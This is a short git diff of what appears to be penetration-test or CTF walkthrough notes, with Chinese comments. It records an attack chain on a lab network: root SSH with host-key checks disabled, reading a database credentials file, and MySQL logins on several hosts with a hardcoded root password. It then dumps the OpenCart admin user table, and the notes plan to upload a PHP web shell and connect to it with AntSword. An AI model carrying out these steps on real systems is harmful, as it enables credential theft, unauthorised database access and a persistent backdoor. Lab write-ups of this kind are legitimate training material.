@@ -24,12 +24,13 @@ ssh root@172.19.0.6 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 
 # 发现了数据库账号密码
 cat /app/src/user/db.conf
 # 这一步可能也需要试探
-mysql -u root -h 172.19.0.2 -p
-mysql -u root -h 172.19.0.3 -p
-mysql -u root -h 172.19.0.4 -p # 发现结点3
-# 发现了两个数据库
-use opencart;
-'select * from oc_user';
+mysql -uroot -h172.19.0.2 -pCyberShell2021
+mysql -uroot -h172.19.0.3 -pCyberShell2021
+mysql -uroot -h172.19.0.4 -pCyberShell2021 # 发现结点3
+# 发现了另一个数据库
+mysql -uroot -h172.19.0.2 -pCyberShell2021 --execute 'show databases;'
+mysql -uroot -h172.19.0.2 -pCyberShell2021 --execute 'use opencart; show tables;'
+mysql -uroot -h172.19.0.2 -pCyberShell2021 --execute 'use opencart; select * from oc_user;'
 # 发现账号密码，登录opencart管理员界面
 # 上传 1.php
 # 进行蚁剑连接
